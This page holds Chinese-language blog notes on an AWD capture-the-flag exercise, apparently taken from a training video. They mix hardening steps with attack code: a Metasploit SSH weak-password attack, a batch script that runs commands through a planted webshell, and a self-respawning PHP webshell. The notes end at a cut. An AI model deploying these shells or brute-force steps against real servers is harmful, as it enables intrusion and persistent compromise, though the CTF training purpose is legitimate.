@@ -1,0 +1,2141 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="DGZ">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="DGZ">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>AWD学习 · DGZ&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon2.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >DGZ&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">AWD学习</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>DGZ's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            AWD学习
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "AWD">AWD</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">4.3k</span>Reading time: <span class="post-count reading-time">16 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/06/25</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>视频地址：<a href="https://www.bilibili.com/video/BV1Tz4y197fF" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1Tz4y197fF</a></p>
+<p>101 ecshop</p>
+<p>102 学生会登录窗口</p>
+<p>103 502    103:5000  gk商城 </p>
+<p>关键的是要加固</p>
+<p>利用账号进入服务后，看服务的ip地址（172.20.117.102），后面进行访问</p>
+<p>之后看看有没有flag，flag可能在根目录下 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+<p>接下来要加固，首先想弱口令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<p>可以看到有ubuntu、admin账户，而且是/bin/bash的，说明是可以正常登陆的，</p>
+<p>补充知识</p>
+<blockquote>
+<p>/etc/passwd </p>
+<p>通常在Linux系统中，用户的关键信息被存放在系统的/etc/passwd文件中，系统的每一个合法用户账号对应于该文件中的一行记录。这行记录定义了每个用户账号的属性。下面是一个passwd文件的示例(部分摘录)：</p>
+<p>root❌0:0:root:/root:/bin/bash<br>bin❌1:1:bin:/bin:/sbin/nologin<br>daemon❌2:2:daemon:/sbin:/sbin/nologin<br>adm❌3:4:adm:/var/adm:/sbin/nologin</p>
+<p>这个文件的内容非常规律，每行代表一个用户。这些用户中的绝大多数是系统或服务正常运行所必需的用户，我们把这种用户称为系统用户或伪用户。系统用户是不能登录系统的，但是这些用户同样也不能被删除，因为一旦删除，依赖这些用户运行的服务或程序就不能正常执行，会导致系统问题。<br>可以注意到，这个文件用”:”作为分隔符，划分为 7 个字段，我们逐个来看具体的含义。</p>
+<p>(1)用户名称<br>第一个字段中保存的是用户名称。用户名称只是为了方便管理员记忆，而Linux 系统是通过用户 ID (UID) 来区分不同用户、分配用户权限的。用户名称和 UID 的对应正是通过 /etc/passwd 这个文件来定义的。</p>
+<p>(2)密码标志<br>这里的”x”代表的是密码标志，而不是真正的密码，真正的密码是保存在 /etc/shadow 文件中的。在早期的 UNIX 中，这里保存的就是真正的加密密码串，但是这个文件的权限是 644，查询命令如下：<br>[root@localhost ~]# ll /etc/passwd<br>-rw-r–r— 1 root root 1648 12月29 00:17 /etc/passwd</p>
+<p>所有用户都可以读取 /etc/passwd 文件，这样非常容易导致密码的泄露。所以现在的 Linux 系统把真正的加密密码串放置在影子文件/etc/shadow中，而影子文件的权限是 000，查询命令如下：<br>[root@localhost ~]# ll /etc/shadow<br>————— 1 root root 1028 12月29 00:18 /etc/shadow<br>这个文件是没有任何权限的，但因为我是 root 用户，所以读取权限不受限制。当然，用强制修改的方法也是可以手工修改这个文件的内容的。只有 root 用户可以浏览和操作这个文件，这样就最大限度地保证了密码的安全。</p>
+<p>所以在 /etc/passwd 中只有一个”x”代表用户是拥有密码的，我们把这个字段称作密码标志，具体的密码要去 /etc/shadow 文件中查询。但是这个密码标志”x”也是不能被删除的，如果删除了密码标志”x”，那么系统会认为这个用户没有密码，从而导致只输入用户名而不用输入密码就可以登陆（当然只能在使用无密码登录，远程是不可以的），除非特殊情况（如破解用户密码），这当然是不可行的。</p>
+<p>(3)UID<br>第三个字段就是用户 ID(UID)，我们已经知道系统是通过 UID 来识别不同的用户和分配用户权限的。这些 UID 是有使用限制和要求的：<br>0：超级用户 UID。如果用户 UID 为 0，则代表这个账号是管理员账号。在 Linux 中如何把普通用户升级成管理员呢？只需把其他用户的 UID 修改为 0 就可以了<br>1~499：系统用户（伪用户）UID。这些 UID 是系统保留给系统用户的 UID，也就是说 UID 是 1~499 范围内的用户是不能登录系统的，而是用来运行系统或服务的。其中，1~99 是系统保留的账号，系统自动创建；100~499 是预留给用户创建账号的。<br>500~65535：普通用户 UID。建立的普通用户 UID 从 500 开始，最大到 65535。</p>
+<p>(4)GID<br>第四个字段就是用户的组 ID(GID)，也就是这个用户的初始组的标志号。</p>
+<p>(5)用户说明<br>第五个字段是这个用户的简单说明，没有什么特殊作用，可以不写。</p>
+<p>(6)家目录<br>第六个字段是这个用户的家目录，也就是用户登录后有操作权限的访问目录，我们把这个目录称为用户的家目录。</p>
+<p>超级用户的家目录是 /root 目录，普通用户在 /home/ 目录下建立和用户名相同的目录作为家目录，如 lamp 用户的家目录就是 /home/lamp/ 目录。</p>
+<p>(7)登录之后的Shell<br>Shell 就是 Linux 的命令解释器。管理员输入的密码都是 ASCII 码，也就是类似 abcd 的英文。但是系统可以识别的编码是类似 0101 的机器语言。Shell 的作用就是把 ASCII 编码的命令翻译成系统可以识别的机器语言，同时把系统的执行结果翻译为用户可以识别的 ASCII 编码。Linux 的标准 Shell 就是 /bin/bash。</p>
+<p>在 /etc/passwd 文件中，大家可以把这个字段理解为用户登录之后所拥有的权限。如果写入的是 Linux 的标准 Shell，/bin/bash 就代表这个用户拥有权限范围内的所有权限。例如：<br>[root@localhost ~]# vi /etc/passwd<br>lamp❌502:502::/home/lamp:/bin/bash</p>
+<p>我手工添加了 lamp 用户，它的登录 Shell 是 /bin/bash，那么这个用户就可以使用普通用户的所有权限。如果我把 lamp 用户的 Shell 修改为 /sbin/nologin，例如：<br>[root@localhost ~]# vi /etc/passwd<br>lamp❌502:502::/home/lamp:/sbin/nologin</p>
+<p>那么这个用户就不能登录了，因为 /sbin/nologin 就是禁止登录的 Shell。如果我在这里放入的系统命令，如 /usr/bin/passwd，例如：<br>[root@localhost ~]#vi /etc/passwd<br>lamp❌502:502::/home/lamp:/usr/bin/passwd</p>
+<p>那么这个用户可以登录，但登录之后就只能修改自己的密码了。这里不能随便写入和登陆没有关系的命令，如 ls，否则系统不会识别这些命令，也就意味着这个用户不能登录。</p>
+</blockquote>
+<p>当前用户是ubuntu，admin账户可能是弱密码，我们要对admin账户密码进行修改</p>
+<p>切换账户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su admin</span><br></pre></td></tr></table></figure>
+<p>利用ubuntu用户的密码（弱口令）登录 </p>
+<p>然后修改密码 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd</span><br></pre></td></tr></table></figure>
+<p>可以参考（<a href="https://blog.csdn.net/hyfstyle/article/details/90904992）" target="_blank" rel="noopener">https://blog.csdn.net/hyfstyle/article/details/90904992）</a></p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBLWQS.png" alt="NBLWQS.png"></p>
+<p>示例：如果没有修改弱密码，我们利用msf模块进行攻击，扫描一下弱口令，看看哪个服务存在这个问题</p>
+<p>进入kali</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ping ip看通不通</span></span><br><span class="line">ping <span class="number">172.20</span><span class="number">.117</span><span class="number">.102</span> </span><br><span class="line"><span class="comment">#进入msf</span></span><br><span class="line">msfconsole</span><br><span class="line">search ssh_login</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"><span class="comment">#看info信息</span></span><br><span class="line">info</span><br><span class="line"><span class="comment">#需要username、password、RhOSTS</span></span><br><span class="line">set username admin</span><br><span class="line">set password <span class="number">123456</span></span><br><span class="line">set RHOSTS <span class="number">172.20</span><span class="number">.110</span><span class="number">-120.102</span></span><br><span class="line"><span class="comment">#扫描弱口令漏洞，进行攻击</span></span><br><span class="line">exploit</span><br><span class="line"><span class="comment">#看到有Success就是存在漏洞，攻击成功的</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#显示获取到的shell</span></span><br><span class="line">sessions</span><br><span class="line"><span class="comment">#进入服务，i是id，对应攻击成功的服务</span></span><br><span class="line">sessions -i <span class="number">1</span></span><br><span class="line"><span class="comment">#获取根目录下的flag，*是通配符</span></span><br><span class="line">cat /flag*</span><br><span class="line"><span class="comment">#我猜应该可以ls，直接看文件名</span></span><br><span class="line"><span class="comment">#退出当前服务，连接其他服务</span></span><br><span class="line">exit</span><br><span class="line">sessions -i <span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p>如果在msf里面觉得操作不方便，我们也可以直接用ssh连接登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh ubuntu@172.20.117.102</span><br><span class="line">#再输入密码123456</span><br></pre></td></tr></table></figure>
+<p>这个弱密码问题危害比较大，除非你修改了密码并且重启服务，不然人家随便连接，这个session一直存在的</p>
+<p>但是人家可能权限不够，不能直接改你密码，如果权限够的话，可以关掉你的服务，甚至修改密码，那你这场比赛可以去玩单机游戏了</p>
+<p>解决完弱口令的问题，我们接下来要找后门，从web服务入手</p>
+<p>102是个人写的，可能漏洞找起来比较难，而101是网上有的cms，可以从网上找漏洞，进行攻击或者加固</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBL5Zj.png" alt="NBL5Zj.png"></p>
+<p>80端口是web服务，22端口是ssh的</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBL7iq.png" alt="NBL7iq.png"></p>
+<p>68端口是DHCP服务的</p>
+<p>web服务一般放在/var/www/html/目录下，通过grep命令，看有没有一句话木马</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBOlSf.png" alt="NBOlSf.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;eval&quot; -R ./*</span><br><span class="line">#&apos;./*&apos;表示当前目录下 -R 表示递归查询</span><br></pre></td></tr></table></figure>
+<p>搜索出来很多，不太好看</p>
+<p>我们可以用专门的木马查杀软件去找，D盾（自查学习使用）</p>
+<p>另外，有些文件（一句话木马）可能以隐藏文件形式存在，文件名以一个<code>.</code>开头，所以要</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -a</span><br></pre></td></tr></table></figure>
+<p>列出包含隐藏文件的所有文件</p>
+<p>在图形化界面下，键盘按ctrl+H就可以显示所有文件</p>
+<p>在101 ecshop目录下有一个aa.php（要关注这种名字奇怪的文件），里面有一句话木马，利用木马获取flag</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBLzw9.png" alt="NBLzw9.png"></p>
+<p>简单的批量拿flag脚本，get请求</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">110</span>,<span class="number">120</span>):</span><br><span class="line">    url= <span class="string">"http://172.20."</span>+str(i)+<span class="string">".101/aa.php?1=system('cat /flag* ');"</span>  <span class="comment">#要有这个分号</span></span><br><span class="line">    <span class="keyword">try</span>：</span><br><span class="line">    	req=requests.get(url)</span><br><span class="line">    	<span class="keyword">print</span> <span class="string">"172.20."</span>+str(i)+<span class="string">".101"</span>,req.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>可以通过切片的方式只提取有用的值，比如req.text[0,32]</p>
+<p>接下来回到102学生会服务器，因为要登录，但是我们手上没有账号密码，我们可以在服务器内找密码</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBOYwj.png" alt="NBOYwj.png"></p>
+<p>连接mysql服务也要账号密码，但是不知道密码</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBOUkn.png" alt="NBOUkn.png"></p>
+<p>在config.php中找到了账号和密码，<strong>同时也发现了一个shell.php，加固时要把这个文件删掉</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql -u geez -p</span><br><span class="line">#输入密码334...</span><br><span class="line">show databases;</span><br><span class="line">use geez;</span><br><span class="line">show tables;</span><br><span class="line">select * from users;</span><br><span class="line">#就可以看到登录的账号和密码，密码要MD5解密，可以用somd5</span><br></pre></td></tr></table></figure>
+<p>但是同时这里也可以用万能密码登录，因为没有过滤</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBO2kR.png" alt="NBO2kR.png"></p>
+<p>登录成功后意味着你也可以拿这个账号密码去尝试登录别人的</p>
+<p>可以看到存在上传点</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBOdf0.png" alt="NBOdf0.png"></p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBO56O.png" alt="NBO56O.png"></p>
+<p>可以看到路径，可能是出题人出完题测试了一下，但是忘记删了这个php文件</p>
+<p>构造一句话木马</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBOj9P.png" alt="NBOj9P.png"></p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBOzjS.png" alt="NBOzjS.png"></p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBOH7d.png" alt="NBOH7d.png"></p>
+<p>接下来也是很有意思的，如果你在你服务器目录下找到这个shell，说明有人在进行攻击你，而且可能是针对全部服务器的攻击，我们如果没有找到这个漏洞，我们可以直接利用攻击者上传的这个shell，去攻击别人，获得别人的flag。</p>
+<p>这样看来，如果我们是那个攻击者，肯定不想要别人对我的shell进行利用（大概这就是反抄作业？）我们就需要改一下我们的shell，</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBXiAs.png" alt="NBXiAs.png"></p>
+<p>传入的参数a md5的明文只有自己知道（要确保这个明文比较复杂），所以这个脚本只能自己使用，别人无法使用</p>
+<p>而我们在加固时，如果发现有这样的shell，就要删掉</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf 文件</span><br></pre></td></tr></table></figure>
+<p>但是同样地可以利用不死马，让你的删除无效化</p>
+<p>百度一下就可以百度到：<a href="https://www.cnblogs.com/unixcs/p/11301377.html" target="_blank" rel="noopener">https://www.cnblogs.com/unixcs/p/11301377.html</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">$file = <span class="string">'2.php'</span>;</span><br><span class="line">$code = <span class="string">'&lt;?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72")&#123;@eval($_POST[a]);&#125; ?&gt;'</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line">    system(<span class="string">'touch -m -d "2018-12-01 09:10:12" .2.php'</span>);</span><br><span class="line">    usleep(<span class="number">5000</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>为了方便演示，修改成下面的内容</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBXejU.png" alt="NBXejU.png"></p>
+<p>上传这个php文件，就会在上传目录下生成这个.config.php文件，之后用post传参</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBXKHJ.png" alt="NBXKHJ.png"></p>
+<p>获得flag，而且此时就算删掉了这个.config.php文件，也会重新生成</p>
+<p>那中了这种不死马怎么防护呢？</p>
+<p>我们需要重新写一个文件并且上传到相同目录下，通过条件竞争，无效化不死马的操作</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBXQE9.png" alt="NBXQE9.png"></p>
+<p>可以看到这里的code改成123，并且usleep缩的很短</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBXlNR.png" alt="NBXlNR.png"></p>
+<p>将123写入了.config.php文件，从而导致木马失效，但是有可能在某一瞬间是正常木马的状态</p>
+<p>由于很多操作都是要增删改除文件，有时权限不够，我们知道版本号后，可以上网查找提权方法，从而提权，获得操作文件（删除或者移动）的权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
+<p>比如说脏牛提权</p>
+<p>接下来看wp</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBO2kR.png" alt="NBO2kR.png"></p>
+<p>这里可以用万能密码，说明存在sql注入，<strong>也就是可能可以利用sql注入写shell进去</strong></p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBXXVJ.png" alt="NBXXVJ.png"></p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBXzP1.png" alt="NBXzP1.png"></p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBj9xK.png" alt="NBj9xK.png"></p>
+<p>post请求脚本：</p>
